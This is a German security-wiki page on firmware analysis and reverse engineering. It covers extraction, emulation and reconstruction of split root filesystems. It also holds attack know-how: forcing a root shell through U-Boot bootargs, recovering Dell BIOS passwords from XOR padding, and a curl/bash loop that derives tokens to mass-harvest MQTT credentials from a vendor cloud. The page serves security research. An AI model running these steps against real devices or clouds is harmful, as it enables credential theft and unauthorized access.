# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

Informationen zur Beschaffung über zugängliche Hardware-Schnittstellen finden Sie unter [Firmware-Dump mit UART-Konsole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) und [SPI-Flash-Dump](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Für eine wiederholbare UART-Aufzeichnung beim Booten vor dem Zugriff auf die Konsole siehe [SCPI-gesteuerte Stromversorgung und Oszilloskop-Erfassung](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die den korrekten Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software verwaltet und erleichtert, mit der Benutzer interagieren. Sie wird in permanentem Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann und anschließend das Betriebssystem startet. Die Untersuchung und mögliche Modifizierung der Firmware ist ein entscheidender Schritt, um Sicherheitslücken zu identifizieren.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dabei werden Daten zu folgenden Punkten gesammelt:

- CPU-Architektur und darauf laufendes Betriebssystem
- Einzelheiten zum Bootloader
- Hardware-Layout und Datenblätter
- Codebasis-Metriken und Quellcodepfade
- Externe Bibliotheken und Lizenztypen
- Update-Verläufe und regulatorische Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und identifizierte Schwachstellen

Zu diesem Zweck sind **Open-Source-Intelligence-Tools (OSINT)** sehr wertvoll. Gleiches gilt für die manuelle und automatisierte Analyse aller verfügbaren Open-Source-Softwarekomponenten. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware lässt sich auf verschiedene Arten beschaffen, die sich jeweils in ihrer Komplexität unterscheiden:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Erstellen** anhand bereitgestellter Anweisungen
- **Herunterladen** von offiziellen Support-Websites
- Mithilfe von **Google-Dorking** gehostete Firmware-Dateien finden
- Direkt auf **Cloud-Speicher** zugreifen, zum Beispiel mit [S3Scanner](https://github.com/sa7mon/S3Scanner)
- **Updates** mithilfe von Man-in-the-Middle-Techniken abfangen
- Firmware über Verbindungen wie **UART**, **JTAG** oder **PICit** vom Gerät **extrahieren**
- In der Gerätekommunikation nach Update-Anfragen **lauschen**
- **Fest codierte Update-Endpunkte** identifizieren und verwenden
- Firmware aus dem Bootloader oder über das Netzwerk **dumpen**
- Falls nichts anderes funktioniert, den Speicherchip mit geeigneten Hardware-Tools **entfernen und auslesen**

### Nur UART-Logs: Root-Shell über U-Boot-Umgebungsvariablen im Flash erzwingen

Wenn UART RX ignoriert wird (nur Logs), können Sie trotzdem eine Init-Shell erzwingen, indem Sie den **U-Boot-Umgebungsblob** offline bearbeiten:<sup>[[6]](#references)</sup>

1. SPI-Flash mit einem SOIC-8-Clip und einem Programmer dumpen (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32 für das Blob neu**.
3. Flashe nur die env-Partition erneut und starte das Gerät neu; auf UART sollte eine Shell erscheinen.

Das ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, aber über externen Flash-Zugriff in die env-Partition geschrieben werden kann.

## Firmware analysieren

Nachdem du jetzt **die Firmware hast**, musst du Informationen darüber extrahieren, um zu wissen, wie du mit ihr umgehen musst. Dafür stehen dir verschiedene Tools zur Verfügung:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, prüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du mit diesen Tools **Dateien extrahieren, die in der Firmware eingebettet sind**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder mit [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) die Datei untersuchen.

### Differenzielle Flash-Analyse und wiederherstellbare XOR-Geheimnisspeicher

Wenn es für eine Firmware-Einstellung kein dokumentiertes Speicherformat gibt, lies zunächst mehrmals den passenden Flash aus, ändere **genau eine** Einstellung, erstelle erneut einen vollständigen Dump des Chips und vergleiche die Offsets. Durch Wiederholung des Experiments mit kontrollierten Werten lässt sich die Einstellung von Zählern und Schreibmetadaten unterscheiden. Änderungen an neuen statt an bestehenden Offsets deuten auf einen append-only oder log-structured Speicher hin. Behalte gelöschte oder als gelöscht markierte Einträge bei, da ihre Nutzdaten möglicherweise wiederhergestellt werden können.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nach dem Auffinden des Bereichs extrahieren Sie die Firmware-Module mit Tools wie `binwalk` und reverse-engineeren Sie den Writer/Validator in Ghidra. Bestätigen Sie Feldgrenzen, Padding, Schlüsselindizierung und Schlüsselableitung im Code, statt das Verfahren nur aus Chiffretextmustern abzuleiten.<sup>[[12]](#references)</sup>

#### Schlüssel aus verschlüsseltem Null-Padding wiederherstellen

Wie unter [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) beschrieben, legt Klartext die Schlüsselstrombytes an denselben Offsets offen. Ein Feld fester Größe ist besonders anfällig, wenn sein Null-Padding alle Indizes eines sich wiederholenden XOR-Schlüssels abdeckt: Das verschlüsselte Padding legt diese Schlüsselbytes direkt offen, da `0x00 XOR key_byte = key_byte`. Wenn jeder Schlüsselindex abgedeckt ist, lässt sich der Schlüssel aus dem Chiffretext am Ende rekonstruieren und die Feldinhalte lassen sich entschlüsseln.<sup>[[12]](#references)</sup>

Das anfällige DVAR-BIOS-Passwortformat von Dell ist ein konkretes Beispiel: Byte `0` eines 32-Byte-Felds liegt im Klartext vor, während für die Bytes `1..31` ein sich wiederholender 20-Byte-Schlüssel verwendet wird.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bei einer Passwortlänge von `L` waren die Positionen `L..31` vor dem XOR null. Wenn `L <= 12` gilt, decken diese Positionen jeden Schlüsselindex ab, sodass der vollständige Schlüssel und das Passwort ohne brute force wiederhergestellt werden:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Schlüssel aus historischen Datensätzen extrahieren

Analysiere nicht jeden Datensatz einzeln. Der DVAR-Schlüssel wird ungefähr wie folgt abgeleitet: `modified_md5(device_seed || variable_GUID || password[0])`. Der device seed und die GUID sind fest, und die einzige passwortabhängige Eingabe ist das erste Byte im Klartext. Dadurch gibt es pro Gerät höchstens 256 Schlüssel, und Datensätze, die mit demselben Byte beginnen, verwenden denselben Schlüssel. Gruppiere aktive und gelöschte Datensätze nach diesem Byte; ein kurzer historischer Datensatz kann durch Padding den vollständigen Schlüssel leaken und damit einen aktuellen, längeren Datensatz entschlüsseln, dessen eigenes Padding nicht ausreicht. Eine Passwortrotation kann die Angriffsfläche daher vergrößern, wenn alte Ciphertexte tombstoned statt gelöscht werden.<sup>[[12]](#references)</sup>

Das Tool [`dellpwn`](https://github.com/R3n5k1/dellpwn) findet DVAR, validiert mögliche Datensätze, stellt Passwörter wieder her und kann rohe gespeicherte Schlüssel-Bytes anzeigen. Erstelle es aus einem Checkout und untersuche ein verifiziertes Flash-Image wie folgt:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Für benutzerdefinierte Parser lassen sich False Positives anhand der Datensatzstruktur, druckbarer Zeichen, Null-Padding-Prüfungen, Schlüsselentropie und Konsistenz beim Umlauf des Schlüssels verwerfen. Wenn wiederholte Dumps spärliche Bitflips pro Schreibvorgang zeigen, sollten die beobachteten Masken aufgelistet und mögliche Korrekturen anhand dieser Einschränkungen bewertet werden. Mehrdeutige Zeichen sollten jedoch als solche angegeben und nicht als exakte Wiederherstellung ausgegeben werden.<sup>[[12]](#references)</sup>

Passwortverifizierer sollten statt umkehrbarem Chiffretext einen gesalzenen, iterierten One-Way-Hash speichern. Log-strukturierte Speicher sollten veraltetes geheimes Material sicher entfernen.<sup>[[12]](#references)</sup>

### Dateisystem extrahieren

Mit den zuvor kommentierten Tools wie `binwalk -ev <bin>` solltest du das **Dateisystem extrahiert** haben können.\
Binwalk extrahiert es üblicherweise in einem **Ordner mit dem Namen des Dateisystemtyps**, der meist einem der folgenden entspricht: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal enthält binwalk das Magic Byte des Dateisystems **nicht in seinen Signaturen**. Verwende in diesen Fällen binwalk, um **den Offset des Dateisystems zu finden, das komprimierte Dateisystem aus der Binärdatei herauszuschneiden** und das Dateisystem anschließend anhand der folgenden Schritte je nach Typ **manuell zu extrahieren**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führen Sie den folgenden **dd-Befehl** aus, um das Squashfs-Dateisystem zu extrahieren.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Aufteilen eingebetteter Root-Dateisysteme rekonstruieren

Wenn ein roher eMMC-/SSD-Dump einen gültigen Dateisystem-Header enthält, dessen Metadaten-Offsets jedoch über die nominale Partition hinausgehen, sollte er nicht sofort als beschädigt eingestuft werden. Eingebetteter Boot-Code kann das tatsächliche Root-Gerät mithilfe von Device Mapper aus mehreren physischen Bereichen zusammensetzen. Daher liefert das Carving einer einzelnen GPT-Partition nur das erste Segment.<sup>[[9]](#references)</sup>

#### Das vollständige Datenträger-Image triagieren

Vergewissere dich zunächst, dass die Erfassung abgeschlossen ist, die Größe stabil bleibt und kein Prozess das Image noch zum Schreiben geöffnet hat. Wenn der Dateiname eine Start-/Endadresse enthält, vergleiche diesen Bereich mit der tatsächlichen Byteanzahl. Stelle die GPT im Nur-Lese-Modus wieder her und hänge nur den erforderlichen Bereich ein. Führe **nicht** `vgchange -ay` für ein nicht vertrauenswürdiges Physical Volume auf der Workstation aus, da Konflikte mit Volume Groups und unbeabsichtigte Schreibvorgänge möglich sind.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verwende eine Wegwerf-VM, wenn die ursprüngliche Init-Logik oder ein LVM-Stack das vollständige Image benötigt. Historische Boot-Logs einer Standard-Boot-Partition sind besonders nützlich: Der Bootloader hat möglicherweise Offsets proprietärer Container, Komponentenlängen, Slot-Auswahl, Ausrichtungsregeln und Signaturprüfungen protokolliert. Nutze diese Werte, um eine eingebettete Kommandozeile, einen Kernel oder ein initramfs herauszulösen, und validiere jede Ausgabe einzeln mit `file`, Magic Bytes und `binwalk`; das Lesen bis zum Ende des Containers kann versehentlich ein initrd, ein ACPI-Objekt oder eine Signatur an den Kernel anhängen.<sup>[[9]](#references)</sup>

#### Die Blockzuordnung beim Booten ermitteln

Extrahiere das initramfs des Kernels und analysiere `/init` sowie alle Speicherbibliotheken durch Reverse Engineering. Folge in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) den String-Referenzen für `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` und Partitionspfade. Verfolge dann den Code, der den aktiven A/B-Slot auswählt und die Tabelle erstellt. Nützliche Einstiegspunkte in radare2 sind `r2 -A init`, `afl`, `pdf @ main` und `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Das linear target ordnet aufeinanderfolgende Bereiche eines virtuellen Geräts Bereichen eines oder mehrerer zugrunde liegender Geräte zu. Eine rekonstruierte Tabelle mit zwei Segmenten hat häufig folgende Form (alle Positionen und Längen sind 512-Byte-Sektoren):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Bilde die Maschinencode-Arithmetik exakt nach, einschließlich Integer-Breite, Shifts und Einheitenumrechnungen. Der folgende Ausdruck rundet beispielsweise eine Byte-Größe auf eine 4-KiB-Grenze ab und rechnet sie erst danach in 512-Byte-Sektoren um; würde man ihn durch `p4_bytes // 512` ersetzen, verschöbe sich der ausgewählte Tail um `p4_bytes % 4096`, wenn die Partition nicht an einer Seitengrenze ausgerichtet ist.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ein flaches Analyse-Image rekonstruieren, indem die Bereiche in Tabellenreihenfolge und in begrenzten Chunks kopiert werden, statt den vollständigen Media-Dump in den Speicher zu laden. Dadurch werden auch Mapper-Geräte auf der Host-Seite vermieden. Die aus der GPT abgeleiteten Offsets, die umgekehrten Sektoranzahlen und die resultierende Ausgabelänge als separate Assertions behandeln.<sup>[[9]](#references)</sup>

#### Beschädigung von einem konstanten Rekonstruktionsfehler unterscheiden

Bei SquashFS vor dem Ausführen von `unsquashfs` die Magic `hsqs` prüfen und das little-endian 64-Bit-Feld `bytes_used` am Superblock-Offset 40 decodieren. Falls die Extraktion bei mehreren voneinander unabhängigen Strukturen fehlschlägt, ein breites Fenster um die erwarteten Positionen durchsuchen und aussagekräftige strukturelle Kandidaten verlangen: einen dekomprimierbaren Metadatenblock, mehrere aufeinanderfolgende gültige Verzeichniseinträge, plausible Inode-Felder, einen Root-Inode, der mit der Anzahl der Inodes übereinstimmt, oder eine gültige Integritätsmetadatenstruktur. Ein einzelner Magic-Treffer reicht nicht aus.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wenn dasselbe signierte Delta unabhängige Strukturen gültig macht – zum Beispiel Verzeichnis-Metadaten und einen Verity-Eintrag –, liegt die wahrscheinliche Ursache in einem systematischen Fehler beim Segmentstart und nicht in fehlenden Bytes. Kehren Sie zur umgekehrten Berechnung zurück und suchen Sie nach verworfenen Resten, Vorzeichenbehandlung, Überläufen oder Sektor-/Seitenrundungen, bevor Sie versuchen, verwaiste Daten wiederherzustellen oder Dateisystem-Metadaten zu patchen.<sup>[[9]](#references)</sup>

Halten Sie schließlich die Schutzgrenzen getrennt: TPM-versiegelte LUKS-Volumes schützen die Vertraulichkeit der Daten, während ein signiertes dm-verity-Mapping die Integrität des Root-Dateisystems schützt. Ein Software-TPM kann keinen Schlüssel wiederherstellen, der an das ursprüngliche physische TPM gebunden ist. Das Booten eines modifizierten SquashFS über ein nur zu Forschungszwecken verwendetes Init, das die Verity-Prüfung auslässt, fälscht weder dessen Signatur noch umgeht es dm-verity.<sup>[[9]](#references)</sup>

## Firmware analysieren

Sobald die Firmware beschafft wurde, ist es wichtig, sie zu zerlegen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dazu werden verschiedene Tools verwendet, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Werkzeuge für die erste Analyse

Für die erste Untersuchung der Binärdatei (bezeichnet als `<bin>`) stehen verschiedene Befehle zur Verfügung. Sie helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und Details zu Partitionen und Dateisystemen zu ermitteln:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf mögliche Verschlüsselung oder Komprimierung hindeutet.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiinspektion empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` lässt sich das Dateisystem normalerweise extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp aufgrund fehlender Magic Bytes jedoch nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend mit dem Befehl `dd` das Dateisystem herausgeschnitten:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Sobald das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Zugangsdaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

Zu den **wichtigen Speicherorten** und **Elementen**, die untersucht werden sollten, gehören:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf mögliche Schwachstellen
- Eingebettete Binärdateien für weitere Analysen
- Gängige Webserver und Binärdateien von IoT-Geräten

Verschiedene Tools helfen dabei, vertrauliche Informationen und Sicherheitslücken im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) für die Suche nach vertraulichen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analysen
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen kompilierter Binärdateien

Sowohl Quellcode als auch kompilierte Binärdateien im Dateisystem müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens abgreifen

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse kann sich herausstellen, dass `<token>` lokal anhand der Geräte-ID und eines fest codierten Geheimnisses abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Dieses Design ermöglicht es jedem, der eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen. Diese enthält häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe.

Praktischer Ablauf:

1) deviceId aus den UART-Boot-Logs extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und die Logs aufzeichnen:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suchen Sie nach Zeilen, die das Muster der Cloud-Konfigurations-URL und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware ermitteln

- Lade Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder der Verwendung von MD5.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Zugangsdaten abgreifen

- Die URL zusammenstellen und JSON mit curl abrufen; mit jq analysieren, um Secrets zu extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Klartext-MQTT und schwache Topic-ACLs missbrauchen (falls vorhanden)

- Verwende wiederhergestellte Zugangsdaten, um Wartungs-Topics zu abonnieren und nach sensiblen Ereignissen zu suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Geräte-IDs enumerieren (in großem Umfang, mit Genehmigung)

- Viele Ökosysteme enthalten Vendor-OUI-, Produkt- und Typ-Bytes, gefolgt von einem fortlaufenden Suffix.
- Du kannst mögliche IDs iterieren, Tokens ableiten und Konfigurationen programmgesteuert abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du eine Mass Enumeration versuchst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Secrets wiederherzustellen, ohne die Zielhardware zu verändern.


Der Prozess der Firmware-Emulation ermöglicht **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen durch Hardware- oder Architekturabhängigkeiten stoßen. Die Übertragung des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness, etwa einen Raspberry Pi, oder auf eine vorbereitete virtuelle Maschine kann jedoch weitere Tests erleichtern.

### Einzelne Binärdateien emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und die CPU-Architektur des Programms zu ermitteln.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei für eine MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationswerkzeuge zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big Endian) wird `qemu-mips` verwendet; für Little-Endian-Binärdateien ist `qemu-mipsel` die richtige Wahl.

#### Emulation der ARM-Architektur

Bei ARM-Binärdateien ist das Vorgehen ähnlich: Zur Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation. Sie automatisieren den Prozess und unterstützen die dynamische Analyse.

### Aufteilen und verifizierte Root-Dateisysteme für die Emulation rekonstruieren

Wenn ein SquashFS-Superblock lesbar ist, die Offsets der Inodes, Verzeichnisse oder Fragmenttabellen jedoch unmöglich erscheinen, sollte `unsquashfs` nicht sofort gepatcht werden. Analysiere stattdessen das frühe Boot-Binary rückwärts und bilde den Blockgeräte-Graphen nach, den es erstellt: Eingebettete Systeme können zwar eine nominelle Root-Partition bereitstellen, das eigentliche Dateisystem aber mit einer `dm-linear`-Zuordnung erstellen, die Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock berücksichtigen, können erfolgreich sein, obwohl alle nachfolgenden Metadatenblöcke verschoben sind.<sup>[[11]](#references)</sup>

Die Arithmetik der Firmware muss exakt beibehalten werden. Ermittle insbesondere, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; bilde Shifts und Abschneidungen in der ursprünglichen Reihenfolge nach; und berücksichtige bankabhängige Endbereiche bei A/B-Layouts. Beispielsweise schneidet `(partition_bytes >> 12) << 3` zunächst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst danach in 512-Byte-Sektoren an. Wird dies durch `partition_bytes // 512` ersetzt, kann sich der angehängte Bereich um einige Kilobyte verschieben und alle nachfolgenden SquashFS-Tabellen beschädigen.<sup>[[11]](#references)</sup>

Ein sinnvoller Validierungsablauf ist:<sup>[[11]](#references)</sup>

1. Ermittle aus dem Verifier-/Init-Binary für jedes `dm-linear`-Segment das Quellgerät, den Startsektor und die Länge.
2. Verknüpfe oder mappe die Bereiche, ohne ihre Ausrichtungssemantik zu verändern.
3. Schlägt die Extraktion weiterhin fehl, suche nur in einem kleinen Bereich um die vorhergesagte Grenze und verlange mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt allein einen plausibel wirkenden Superblock zu akzeptieren.
4. Führe ein unverändertes `unsquashfs` mit dem rekonstruierten Image aus. Das erfolgreiche Durchlaufen aller Verzeichnisse und Fragmente ist ein stärkerer Beleg als `unsquashfs -stat`.

#### Vom Analysten kontrollierter Ersatz für dm-verity

Wenn der Analyst den QEMU-Kernel, das Initramfs und die virtuellen Datenträger kontrolliert, kann ein modifiziertes Root gestartet werden, indem die Verifizierungs-PID 1 des Herstellers durch ein kleines statisch gelinktes Init ersetzt wird. Dies ist ein **Boot-Chain-Austausch im Labor** und kein Angriff auf dm-verity, dessen RSA-Signatur, Secure Boot oder einen TPM-versiegelten Schlüssel.<sup>[[11]](#references)</sup>

Das Ersatz-Init sollte die operativen Schritte des ursprünglichen Bootpfads nachbilden: `devtmpfs` mounten, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` mounten, auf das bereitgestellte Blockgerät warten, das bearbeitete Root schreibgeschützt mounten, die Pseudo-Dateisysteme des alten Roots aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Werden `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` ausgehängt, wird verhindert, dass versehentlich Mountpoints ausgehängt werden, die zum neuen Root gehören.<sup>[[11]](#references)</sup>

Der veränderliche Gerätezustand sollte getrennt vom modifizierten unveränderlichen Root gehalten werden. Ein qcow2-Overlay kann den LVM-Zustand des ursprünglichen Datenträgers erhalten, während ein zweiter schreibgeschützter virtio-Datenträger das bearbeitete SquashFS bereitstellt:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
